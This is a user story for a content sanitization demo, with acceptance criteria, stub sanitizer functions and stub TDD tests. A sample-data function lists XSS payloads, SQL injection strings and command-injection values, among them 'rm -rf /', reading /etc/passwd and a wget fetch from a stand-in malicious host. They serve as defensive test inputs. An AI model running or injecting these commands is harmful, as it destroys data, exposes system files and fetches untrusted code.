# Epic 5, Story 3: Content Sanitization Demo

## Story Overview

**Epic**: Security & Validation Framework  
**Story ID**: 5.3  
**Priority**: Medium  
**Effort**: 4 Story Points  

## User Story

**As a** content manager  
**I want** to see how content sanitization works  
**So that** I can understand how the system protects against content-based attacks  

## Acceptance Criteria

- [ ] HTML/script injection attempts are sanitized
- [ ] SQL injection patterns are detected and neutralized
- [ ] Command injection attempts are prevented
- [ ] Sanitization preserves legitimate content
- [ ] Sanitization performance impact is measured

## TDD Requirements

- Write tests for sanitization effectiveness before implementing sanitization
- Test content preservation before creating preservation logic
- Verify performance impact before optimizing sanitization

## Definition of Done

- [ ] Sanitization effectively prevents all tested attack vectors
- [ ] Legitimate content is preserved accurately
- [ ] Performance impact is acceptable for production use
- [ ] Sanitization rules are configurable and maintainable
- [ ] All tests pass in RED-GREEN-REFACTOR cycle
- [ ] Interactive demo works smoothly
- [ ] Clear before/after comparisons provided
- [ ] Performance metrics are displayed

## Technical Implementation Notes

### Content Sanitization Components
```python
# Security and sanitization modules
from src.security.security import SecurityConfig, FileValidator
from src.utils.monitoring import SystemMonitor
from src.utils.performance import PerformanceMonitor

# Content processing libraries
import re
import html
import bleach
from markupsafe import escape
import time
import pandas as pd
import matplotlib.pyplot as plt
```

### Sanitization Functions
```python
def sanitize_html_content(content):
    """Sanitize HTML content to prevent XSS attacks"""
    pass

def detect_sql_injection(content):
    """Detect and neutralize SQL injection patterns"""
    pass

def prevent_command_injection(content):
    """Prevent command injection attempts"""
    pass

def sanitize_script_tags(content):
    """Remove or neutralize script tags"""
    pass

def preserve_legitimate_content(content, sanitization_rules):
    """Ensure legitimate content is preserved during sanitization"""
    pass

def measure_sanitization_performance(content, sanitization_func):
    """Measure performance impact of sanitization"""
    pass
```

### Attack Patterns to Demonstrate
```python
def create_attack_samples():
    """Create sample content with various attack patterns"""
    samples = {
        'xss_attacks': [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"</iframe>'
        ],
        'sql_injection': [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "admin'--"
        ],
        'command_injection': [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`"
        ],
        'legitimate_content': [
            "<p>This is a normal paragraph</p>",
            "SELECT name FROM users WHERE id = 1",
            "echo 'Hello World'",
            "<strong>Important:</strong> Please review this document"
        ]
    }
    return samples
```

### Interactive Demo Components
```python
def create_content_input_widget():
    """Create widget for inputting content to sanitize"""
    pass

def create_sanitization_options():
    """Create widget for selecting sanitization options"""
    pass

def create_before_after_display():
    """Create display for before/after content comparison"""
    pass

def create_performance_monitor():
    """Create widget for monitoring sanitization performance"""
    pass

def create_attack_pattern_selector():
    """Create widget for selecting predefined attack patterns"""
    pass
```

## Test Cases

### Test Case 1: XSS Prevention
```python
def test_xss_prevention():
    """Test XSS attack prevention"""
    # RED: Write failing test for XSS prevention
    # GREEN: Implement XSS sanitization
    # REFACTOR: Optimize XSS detection
    pass
```

### Test Case 2: SQL Injection Detection
```python
def test_sql_injection_detection():
    """Test SQL injection pattern detection"""
    # RED: Write failing test for SQL injection detection
    # GREEN: Implement SQL injection detection
    # REFACTOR: Improve detection accuracy
    pass
```

### Test Case 3: Command Injection Prevention
```python
def test_command_injection_prevention():
    """Test command injection prevention"""
    # RED: Write failing test for command injection
    # GREEN: Implement command injection prevention
    # REFACTOR: Optimize prevention logic
    pass
```

### Test Case 4: Content Preservation
```python
def test_content_preservation():
    """Test legitimate content preservation"""
    # RED: Write failing test for content preservation
    # GREEN: Implement preservation logic
    # REFACTOR: Improve preservation accuracy
    pass
```

### Test Case 5: Performance Impact
```python

    """Test sanitization performance impact"""
    # RED: Write failing test for performance measurement
    # GREEN: Implement performance monitoring
    # REFACTOR: Optimize sanitization performance
    pass
```
